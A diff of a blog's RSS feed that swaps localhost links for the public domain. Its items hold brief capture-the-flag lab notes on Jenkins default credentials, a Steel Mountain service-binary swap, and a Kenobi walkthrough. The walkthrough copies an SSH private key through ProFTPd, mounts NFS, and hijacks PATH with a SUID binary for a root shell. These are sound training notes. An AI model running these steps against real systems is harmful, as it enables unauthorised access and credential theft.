@@ -2,31 +2,31 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Ethical Hacking on Analyst</title>
-    <link>http://localhost:1313/docs/notes/labs/red/</link>
+    <link>https://bakerst221b.com/docs/notes/labs/red/</link>
     <description>Recent content in Ethical Hacking on Analyst</description>
     <generator>Hugo</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 28 Jul 2022 15:14:39 +1000</lastBuildDate>
-    <atom:link href="http://localhost:1313/docs/notes/labs/red/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://bakerst221b.com/docs/notes/labs/red/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Jenkins Alfred</title>
-      <link>http://localhost:1313/docs/notes/labs/red/jenkins/</link>
+      <link>https://bakerst221b.com/docs/notes/labs/red/jenkins/</link>
       <pubDate>Thu, 28 Jul 2022 15:14:39 +1000</pubDate>
-      <guid>http://localhost:1313/docs/notes/labs/red/jenkins/</guid>
+      <guid>https://bakerst221b.com/docs/notes/labs/red/jenkins/</guid>
       <description>&lt;p&gt;Defauld creds &lt;code&gt;admin:admin&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;&#xA;&lt;details&gt;&#xA;    &lt;summary&gt;Expand&amp;hellip;&lt;/summary&gt;&#xA;    Something here&#xA;&lt;/details&gt;</description>
     </item>
     <item>
       <title>Stell Mountain</title>
-      <link>http://localhost:1313/docs/notes/labs/red/steel-mountain/</link>
+      <link>https://bakerst221b.com/docs/notes/labs/red/steel-mountain/</link>
       <pubDate>Thu, 28 Jul 2022 15:14:39 +1000</pubDate>
-      <guid>http://localhost:1313/docs/notes/labs/red/steel-mountain/</guid>
+      <guid>https://bakerst221b.com/docs/notes/labs/red/steel-mountain/</guid>
       <description>&lt;blockquote&gt;&#xA;&lt;p&gt;The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!&#xA;Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Temp Notes for Red Teaming</title>
-      <link>http://localhost:1313/docs/notes/labs/red/kenobi/</link>
+      <link>https://bakerst221b.com/docs/notes/labs/red/kenobi/</link>
       <pubDate>Thu, 28 Jul 2022 15:14:39 +1000</pubDate>
-      <guid>http://localhost:1313/docs/notes/labs/red/kenobi/</guid>
+      <guid>https://bakerst221b.com/docs/notes/labs/red/kenobi/</guid>
       <description>&lt;h2 id=&#34;kenobi&#34;&gt;Kenobi&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/kenobi&#34;&gt;https://tryhackme.com/room/kenobi&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;-rtfm&#34;&gt;📕 RTFM&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbclient //10.10.206.61/anonymous&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbget -R smb://10.10.206.61/anonymous&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc ftp.server.com &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Pro FTPd&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SITE CPFR /home/kenobi/.ssh/id_rsa&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SITE CPTO /var/tmp/id_rsa&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;searchsploit &amp;lt;app_name&amp;gt; &amp;lt;app version&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir /mnt/kenobiNFS&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount machine_ip:/var /mnt/kenobiNFS&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -la /mnt/kenobiNFS&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -i id_rsa kenobi@10.10.206.61&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Find SUID/SGID files&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -perm -u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strings /usr/bin/menu&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo /bin/sh &amp;gt; curl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; curl &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp:$PATH^C&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/menu &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;images/linux-perm.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Say, for example, that some utility has this bit set. That means that the utility has elevated permissions. You might get lucky; check the executable with strings for some commands. If you see some system utility without a full path, you can create a script in the same location and it will be run instead.&lt;/p&gt;</description>
     </item>
   </channel>
